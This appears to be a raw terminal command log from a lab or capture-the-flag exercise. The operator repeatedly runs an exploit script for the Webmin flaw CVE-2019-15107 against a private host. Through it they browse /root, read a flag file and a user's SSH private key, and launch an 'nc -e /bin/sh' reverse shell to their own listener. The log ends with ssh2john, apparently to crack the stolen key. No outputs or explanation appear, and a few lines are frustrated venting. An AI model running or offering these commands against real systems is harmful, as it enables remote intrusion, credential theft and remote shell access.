INPUT|85--30|U|1594800547|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/; pwd|OUTPUT
INPUT|85--31|U|1594800560|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; pwd|OUTPUT
INPUT|85--32|U|1594800565|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls|OUTPUT
INPUT|85--33|U|1594800572|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls|OUTPUT
INPUT|85--34|U|1594800585|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/; ls -al|OUTPUT
INPUT|85--35|U|1594800601|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/;|OUTPUT
INPUT|85--36|U|1594800630|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ pwd;|OUTPUT
INPUT|85--37|U|1594800642|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls -al /root/;|OUTPUT
INPUT|85--38|U|1594800707|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls';|OUTPUT
INPUT|85--39|U|1594800712|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; ls -al';|OUTPUT
INPUT|85--40|U|1594800718|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'cd /root; pwd';|OUTPUT
INPUT|85--41|U|1594800730|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'ls';|OUTPUT
INPUT|85--42|U|1594800734|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd';|OUTPUT
INPUT|85--43|U|1594800737|85|python CVE_2019_15107.py http://172.18.1.5:10000 bash -c 'pwd'|OUTPUT
INPUT|85--44|U|1594800785|85|python CVE_2019_15107.py http://172.18.1.5:10000 /bin/bash -c 'echo anal'|OUTPUT
INPUT|85--45|U|1594800795|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--46|U|1594800807|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root|OUTPUT
INPUT|85--47|U|1594800873|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & ls|OUTPUT
INPUT|85--48|U|1594800886|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/|OUTPUT
INPUT|85--49|U|1594800905|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ & echo hello|OUTPUT
INPUT|85--50|U|1594800933|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ & echo hello'|OUTPUT
INPUT|85--51|U|1594800943|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && echo hello'|OUTPUT
INPUT|85--52|U|1594800968|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd'|OUTPUT
INPUT|85--53|U|1594800979|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/ && pwd|OUTPUT
INPUT|85--54|U|1594801021|85|python CVE_2019_15107.py http://172.18.1.5:10000 cat /root/flag|OUTPUT
INPUT|85--55|U|1594801031|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--56|U|1594801045|85|python CVE_2019_15107.py http://172.18.1.5:10000 cd /root/|OUTPUT
INPUT|85--57|U|1594801063|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--58|U|1594801073|85|python CVE_2019_15107.py http://172.18.1.5:10000 touch file|OUTPUT
INPUT|85--59|U|1594801087|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls /root/ > file|OUTPUT
INPUT|85--60|U|1594801095|85|python CVE_2019_15107.py http://172.18.1.5:10000 cat file|OUTPUT
INPUT|85--61|U|1594801110|85|python CVE_2019_15107.py http://172.18.1.5:10000 ls|OUTPUT
INPUT|85--62|U|1594801146|85|ls|OUTPUT
INPUT|85--63|U|1594801171|85|python CVE_2019_15107.py http://172.18.1.5:10000 pwd|OUTPUT
INPUT|85--64|U|1594801190|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'|OUTPUT
INPUT|85--65|U|1594801207|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /root/WARNING-READ-ME.txt'|OUTPUT
INPUT|85--66|U|1594801414|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find *.txt'|OUTPUT
INPUT|85--67|U|1594801469|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/ && pwd'|OUTPUT
INPUT|85--68|U|1594801474|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root/; pwd'|OUTPUT
INPUT|85--69|U|1594801479|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cd /root; pwd'|OUTPUT
INPUT|85--70|U|1594801501|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /'|OUTPUT
INPUT|85--71|U|1594801511|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--72|U|1594801520|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/alive'|OUTPUT
INPUT|85--73|U|1594801527|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/alice'|OUTPUT
INPUT|85--74|U|1594801535|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/bob'|OUTPUT
INPUT|85--75|U|1594801540|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/eve'|OUTPUT
INPUT|85--76|U|1594801564|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/.ssh'|OUTPUT
INPUT|85--77|U|1594801582|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa'|OUTPUT
INPUT|85--78|U|1594801612|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/eve/.ssh'|OUTPUT
INPUT|85--79|U|1594801619|85|python CVE_2019_15107.py http://172.18.1.5:10000 'cat /home/eve/.ssh/id_rsa.pub'|OUTPUT
INPUT|85--80|U|1594801642|85|ls|OUTPUT
INPUT|85--81|U|1594801664|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--82|U|1594801671|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home/debian'|OUTPUT
INPUT|85--83|U|1594801681|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian'|OUTPUT
INPUT|85--84|U|1594801692|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible'|OUTPUT
INPUT|85--85|U|1594801698|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home/debian/.ansible/tmp'|OUTPUT
INPUT|85--86|U|1594801729|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /'|OUTPUT
INPUT|85--87|U|1594801742|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /root'|OUTPUT
INPUT|85--88|U|1594801820|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / *.txt'|OUTPUT
INPUT|85--89|U|1594801842|85|python CVE_2019_15107.py http://172.18.1.5:10000 'find -L / -name *.txt'|OUTPUT
INPUT|85--90|U|1594802102|85|ls|OUTPUT
INPUT|85--91|U|1594802114|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /root'|OUTPUT
INPUT|85--92|U|1594802121|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /'|OUTPUT
INPUT|85--93|U|1594802132|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls -al /home'|OUTPUT
INPUT|85--94|U|1594802226|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--95|U|1594802232|85|python CVE_2019_15107.py http://172.18.1.5:10000 'ls /home'|OUTPUT
INPUT|85--96|U|1594802243|85|ping 172.18.1.5|OUTPUT
INPUT|85--97|U|1594802254|85|python CVE_2019_15107.py http://172.18.1.5:10000 'pwd'|OUTPUT
INPUT|85--98|U|1594802441|85|nc -l 8080|OUTPUT
INPUT|85--99|U|1594802505|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--100|U|1594804760|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--101|U|1594804764|85|ls|OUTPUT
INPUT|85--102|U|1594804768|85|cd CVE-2019-15107/|OUTPUT
INPUT|85--103|U|1594804771|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--104|U|1594805091|85|ls|OUTPUT
INPUT|85--105|U|1594805093|85|cd CVE-2019-15107/|OUTPUT
INPUT|85--106|U|1594805096|85|python CVE_2019_15107.py http://172.18.1.5:10000 'nc -e /bin/sh 10.1.135.83 8080'|OUTPUT
INPUT|85--107|U|1594805361|85|aaaaaaaaaaa|OUTPUT
INPUT|85--108|U|1594805365|85|ive had enough|OUTPUT
INPUT|85--109|U|1594805367|85|help|OUTPUT
INPUT|85--110|U|1594805372|85|please|OUTPUT
INPUT|85--111|U|1594805373|85|i beg you|OUTPUT
INPUT|85--112|U|1594805380|85|to je tak na picu lmao|OUTPUT
INPUT|85--113|U|1594805691|85|cd ..|OUTPUT
INPUT|85--114|U|1594805693|85|ls|OUTPUT
INPUT|85--115|U|1594805698|85|python ssh2john.py|OUTPUT
